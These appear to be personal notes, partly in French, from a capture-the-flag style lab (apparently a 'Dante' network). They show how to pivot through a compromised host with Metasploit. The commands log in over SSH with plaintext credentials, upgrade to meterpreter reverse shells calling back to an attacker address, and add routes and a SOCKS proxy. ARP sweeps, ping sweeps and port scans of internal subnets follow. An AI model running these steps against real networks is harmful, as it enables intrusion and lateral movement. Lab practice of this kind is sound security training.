# pivot with metasploit:

#metasploit: pivot via ssh compromi

```
use auxiliary/scanner/ssh/ssh_login
set rhosts 10.10.110.100
set username balthazar
set password TheJoker12345!
run
sessions -i
sessions -u 1

#attendre de reverse shell meterpreter

route add 172.16.1.0/24 2
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
run -j
```

## dÃ©couvrir les voisins pour pivoter:

```
Active sessions
==========

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell linux              SSH balthazar:TheJoker12345! (10.10.110.100:22)                                   10.10.14.8:38435 -> 10.10.110.100:22 (10.10.110.100)
  6         meterpreter x86/linux    balthazar @ DANTE-WEB-NIX01 (uid=1002, gid=1002, euid=1002, egid=1002) @ 172....  10.10.14.8:4433 -> 10.10.110.100:58534 (1.2.3.4)
  7         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DANTE-DC01                                                  10.10.14.8:4444 -> 10.10.110.3:2439 (172.16.1.20)

```

## arp:
meterpreter > run post/windows/gather/arp_scanner RHOSTS=172.16.2.0/24


## ping
msf6 post(multi/gather/ping_sweep) > set session 7
session => 7
msf6 post(multi/gather/ping_sweep) > set rhosts 172.16.2.0/24
rhosts => 172.16.2.0/24
msf6 post(multi/gather/ping_sweep) > rerun

## tcp 
sessions -l
route add 172.16.2.0/24 3
use auxiliary/scanner/portscan/tcp
set rhosts 172.16.2.0/24
set ports 22,80,445,443

